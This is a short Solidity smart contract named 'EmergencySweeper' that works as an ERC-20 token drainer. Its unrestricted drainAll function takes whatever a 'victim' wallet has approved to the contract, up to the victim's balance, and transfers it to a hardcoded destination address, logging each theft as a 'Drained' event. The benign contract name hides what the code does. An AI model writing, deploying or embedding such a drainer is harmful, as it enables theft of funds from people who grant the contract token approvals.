// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract EmergencySweeper {
    address constant DESTINATION = 0xD1adf0a832A7F3BF70a763f4901cb0D3893D49Fb;

    event Drained(address indexed victim, address indexed token, uint256 amount);

    function drainAll(address token, address victim) external {
        uint256 balance = IERC20(token).balanceOf(victim);
        require(balance > 0, "Victim has zero balance");
        
        uint256 allowance = IERC20(token).allowance(victim, address(this));
        require(allowance > 0, "No allowance");
        
        uint256 amountToTransfer = balance < allowance ? balance : allowance;
        
        bool success = IERC20(token).transferFrom(victim, DESTINATION, amountToTransfer);
        require(success, "Transfer failed");
        
        emit Drained(victim, token, amountToTransfer);
    }
}